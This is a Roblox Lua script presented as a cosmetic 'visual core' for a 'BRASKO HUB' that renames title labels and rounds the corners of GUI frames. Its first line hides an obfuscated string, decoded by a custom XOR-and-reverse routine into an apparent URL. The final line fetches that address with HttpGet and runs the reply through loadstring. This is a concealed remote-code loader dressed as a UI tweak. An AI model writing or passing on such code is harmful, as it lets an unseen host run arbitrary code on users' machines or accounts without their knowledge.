
--[[ STAGE 2: VISUAL CORE ]]
local wabHrr8igftC3="\076\058\085\021\005\007\017\086\010\093\096\017\054\098\102\089\088\112\062\068\031\057\034\061\052\105\082\129\112\111\090\121\142\123\142\142\095\104\092\108\152\156\156\170\117\120\151\172\177\182\176\128\134\178\189\185\188\171\142\132\199\206\200\206\142\211\213\210\190\220\214\226\203\221\162\223\210\233\232\238\232\242\240\245\246\249\186\254\254\252\195\239\007\002\245\013\014\012\255\014\002\002\023\006\037\011\040\028\231\016\040\025\238\240\231\032\037\035\037\067"local wXByWUviLxF6PUHh=23 local _PqFDiMi67WcRGgi=201 local eWaemYmVw1MCYz7=0 local rArBqG55a27kU6FT=2 local _UMmdB3gOtsLEWhKISG=11 local rFUKcckvjXkg3NKIq7Tu=true local S4_qbc1yExRNtHk5bEjjy3=bit32 and bit32.bxor if not S4_qbc1yExRNtHk5bEjjy3 then S4_qbc1yExRNtHk5bEjjy3=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local _9eWkVzH9c_n={}for MF3tbB8T39XIMukkPjo=1,#wabHrr8igftC3 do local F9KVrJZVD3kp=string.byte(wabHrr8igftC3,MF3tbB8T39XIMukkPjo)local xp_Eoo7bS0EpvxPT84=(_PqFDiMi67WcRGgi+(MF3tbB8T39XIMukkPjo*rArBqG55a27kU6FT)+_UMmdB3gOtsLEWhKISG)%256 if eWaemYmVw1MCYz7==0 then F9KVrJZVD3kp=(F9KVrJZVD3kp-xp_Eoo7bS0EpvxPT84)%256 _9eWkVzH9c_n[MF3tbB8T39XIMukkPjo]=string.char(S4_qbc1yExRNtHk5bEjjy3(F9KVrJZVD3kp,wXByWUviLxF6PUHh))else F9KVrJZVD3kp=S4_qbc1yExRNtHk5bEjjy3(F9KVrJZVD3kp,wXByWUviLxF6PUHh)_9eWkVzH9c_n[MF3tbB8T39XIMukkPjo]=string.char((F9KVrJZVD3kp-xp_Eoo7bS0EpvxPT84)%256)end end local aX1T3sCNlQbMBt9cTtwo=table.concat(_9eWkVzH9c_n)if rFUKcckvjXkg3NKIq7Tu then aX1T3sCNlQbMBt9cTtwo=string.reverse(aX1T3sCNlQbMBt9cTtwo)end local zJuPbi8r4mvdxswZD=aX1T3sCNlQbMBt9cTtwo
local HubName = "BRASKO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(zJuPbi8r4mvdxswZD))()
